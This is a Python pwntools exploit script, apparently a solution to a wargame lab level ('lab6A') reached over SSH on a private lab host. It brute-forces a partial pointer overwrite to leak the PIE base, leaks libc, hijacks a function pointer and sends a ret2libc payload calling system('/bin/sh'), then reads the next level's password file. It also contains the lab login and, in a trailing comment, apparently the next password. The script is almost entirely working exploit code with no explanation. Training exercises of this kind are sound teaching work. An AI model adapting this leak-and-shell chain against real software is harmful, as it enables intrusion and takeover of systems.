from pwn import *

s = ssh(host = '192.168.147.134', user = 'lab6A', password = 'strncpy_1s_n0t_s0_s4f3_l0l')
e = context.binary = ELF("./lab6A")
def setup_acc(name, descr):
        r.recv()
        r.sendline(b'1')
        r.sendlineafter(b'Enter your name: ', name)
        sleep(1)
        r.sendafter(b'Enter your description: ', descr)
        sleep(1)
context.log_level = 'debug'
while 1:
        try:
                #r = e.process()
                r = s.process("/levels/lab06/lab6A")
                if args.GDB:
                         g = gdbscript(r, api = True)
                setup_acc(b'A' * 31, b'B' * 90 + p16(0x5be2) + b'\0')
                r.sendlineafter(b'Enter Choice: ', b'3')
                s = r.recvuntil(b'B'*90)[:-1]
                if b'Username' not in s:
                        try:
                                r.kill()
                        except: 
                                pass
                        raise Exception("Wrong")
                piebase = u32(r.recv(4)) - 0xbe2
                log.info(hex(piebase))
                setup_acc(b'a', b'b')
                make_note = piebase + 0x9af
                r.sendlineafter(b'Enter Choice: ', b'3')
                sleep(1)
                s = r.recvuntil(b'B' * 90)[:-1]
                libc = u32(r.recv()[16:20]) - 105091
                log.info(hex(libc))
                sleep(2)
                system = libc + 0x40190
                bin_sh = libc + 0x160a24
                r.sendline(b'1')
                sleep(1)
                r.sendline(b'\x00'*2)
                sleep(1)
                r.sendlineafter(b'Enter your description: ',b'C' * 122 + p32(make_note))
                r.sendlineafter(b'Enter Choice: ', b'3')
                payload = b'A' * 52
                payload += p32(system)
                payload += b'A' * 4
                payload += p32(bin_sh)
                r.sendline(payload)
                r.sendline(b'cat /home/lab6end/.pass')
                sleep(1)
                r.interactive()
        except EOFError:
                if args.GDB:
                        g[1].quit()
                continue
#eye_gu3ss_0n_@ll_mah_h0m3w3rk
